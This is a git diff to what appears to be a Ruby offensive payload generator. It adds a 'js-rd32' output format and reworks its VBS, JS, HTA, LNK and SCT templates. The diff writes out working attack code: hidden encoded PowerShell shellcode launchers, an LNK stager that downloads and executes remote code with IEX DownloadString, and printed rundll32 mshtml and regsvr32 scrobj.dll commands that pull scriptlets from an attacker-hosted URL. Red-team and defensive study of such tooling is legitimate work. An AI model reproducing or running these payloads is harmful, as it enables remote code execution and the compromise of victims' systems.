@@ -17,6 +17,7 @@
 # => exe (executable) requires MinGW - x86_64-w64-mingw32-gcc [apt-get install mingw-w64]
 # => java (for use with malicious java applets)
 # => js (javascript)
+# => js-rd32 (javascript called by rundll32.exe)
 # => php (for use with php pages)
 # => hta (HTML applications)
 # => cfm (for use with Adobe ColdFusion)
@@ -57,7 +58,7 @@ optparse = OptionParser.new do|opts|
                 options[:PAYLOAD] = a
         end
 
-    opts.on('-t', '--ENCODE VALUE', "Output format: raw, cmd, vba, vbs, war, exe, java, js, php, hta, cfm, aspx, lnk, sct") do |t|
+    opts.on('-t', '--ENCODE VALUE', "Output format: raw, cmd, vba, vbs, war, exe, java, js, js-rd32, php, hta, cfm, aspx, lnk, sct") do |t|
                 options[:ENCODE] = t
         end
     opts.separator ""
@@ -190,7 +191,7 @@ if $lencode == "vbs"
 powershell_encoded = gen_PS_shellcode()
 
 vbsTEMPLATE = %{Set objShell = CreateObject("Wscript.Shell")
-objShell.Run "cmd.exe /c powershell -nop -win Hidden -noni -enc #{powershell_encoded}", 0
+objShell.Run "powershell -nop -win Hidden -noni -enc #{powershell_encoded}", 0
 }
 
 puts vbsTEMPLATE
@@ -332,10 +333,46 @@ if $lencode == "js"
 powershell_encoded = gen_PS_shellcode()
 
 jsTEMPLATE = %{var objShell = new ActiveXObject("WScript.shell");
-objShell.run("cmd.exe /c powershell -nop -win Hidden -noni -enc #{powershell_encoded}", 0);
+objShell.run("powershell -nop -win Hidden -noni -enc #{powershell_encoded}", 0);
 }
 
 puts jsTEMPLATE
+
+end
+
+########################JS-RD32_ENCODE###############################
+if $lencode == "js-rd32"
+
+powershell_encoded = gen_PS_shellcode()
+
+stageURL = String.new
+
+puts "This encoding format requires staging"
+puts "Enter the full URL on which the payload will be hosted:"
+stageURL = gets.chomp!
+
+
+jsrd32TEMPLATE = %{<?xml version="1.0"?>
+
+<package>
+<component id="ps">
+
+<script language="JScript">
+<![CDATA[
+var r = new ActiveXObject("WScript.Shell").Run("powershell -nop -win Hidden -noni -enc #{powershell_encoded}"); 
+]]>
+</script>
+
+</component>
+</package>
+}
+
+File.write('index.html', jsrd32TEMPLATE) 
+puts "Payload created! - index.html\n\n\n"
+
+
+puts "-------------copy the index.html and host it on #{stageURL}--------------"
+puts "To run, execute the following on the target system:\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:#{stageURL}/index.html\")"
 
 end
 
@@ -362,7 +399,7 @@ htaTEMPLATE = %{<html>
 <head> 
 <script language="VBScript"> 
     Set objShell = CreateObject("Wscript.Shell")
-    objShell.Run "cmd.exe /c powershell -nop -win Hidden -noni -enc #{powershell_encoded}", 0
+    objShell.Run "powershell -nop -win Hidden -noni -enc #{powershell_encoded}", 0
 </script> 
 </head> 
 <body> 
@@ -423,7 +460,7 @@ puts "Enter the full URL on which the payload will be hosted:"
 stageURL = gets.chomp!
 
 
-lnkTEMPLATE = "-nop -win Hidden -noni -command \"IEX (New-Object Net.WebClient).DownloadString('#{stageURL}')\""
+lnkTEMPLATE = "-nop -win Hidden -noni -command \"IEX (New-Object Net.WebClient).DownloadString('#{stageURL}/file.html')\""
 
 # Converting string to an array of char and to HEX
 lnkTEMPLATE_AR = lnkTEMPLATE.split(//)
@@ -456,13 +493,15 @@ end
 outLNKfile = hex_to_bin(lnkPAYLOADstream)
 
 File.binwrite("file.lnk", outLNKfile)
-
 puts "Payload created! - file.lnk\n\n"
 
-
 powershell_encoded = gen_PS_shellcode()
-puts "-------------copy the below code and host it on #{stageURL}--------------"
-puts "powershell -nop -win Hidden -noni -enc #{powershell_encoded}"
+outSTAGE = "powershell -nop -win Hidden -noni -enc #{powershell_encoded}"
+File.write( 'file.html', outSTAGE) 
+puts "Stage file created! - file.html\n\n"
+
+puts "-------------copy file.html and host it on #{stageURL}--------------"
+puts "To run, execute \"file.lnk\" on target system"
 
 end
 
@@ -523,11 +562,11 @@ sctTEMPLATE = %{<?XML version="1.0"?>
 </scriptlet>}
 
 File.write( 'index.sct', sctTEMPLATE) 
-puts "Payload created! - index.sct\n\n"
+puts "Payload created! - index.sct\n\n\n"
 
 
 puts "-------------copy the index.sct and host it on #{stageURL}--------------"
-puts "To run, execute the following on the target system:\n\"regsvr32 /s /n /u /i:#{stageURL}/index.sct scrobj.dll\""
+puts "To run, execute the following on the target system:\nregsvr32 /s /n /u /i:#{stageURL}/index.sct scrobj.dll"
 
 end
 
